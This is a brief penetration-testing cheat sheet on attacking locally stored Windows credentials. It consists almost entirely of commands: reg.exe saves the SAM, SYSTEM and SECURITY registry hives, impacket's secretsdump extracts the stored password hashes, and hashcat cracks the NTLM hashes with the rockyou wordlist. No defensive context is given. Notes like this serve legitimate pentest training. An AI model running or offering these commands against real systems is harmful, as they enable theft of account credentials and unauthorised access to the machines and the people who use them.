# Attacking locally stored credentials

Export the required registry hives

```
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

On the attack box dump the credential hashes

```
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

Store the hashed in a text file and crack them

```
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```
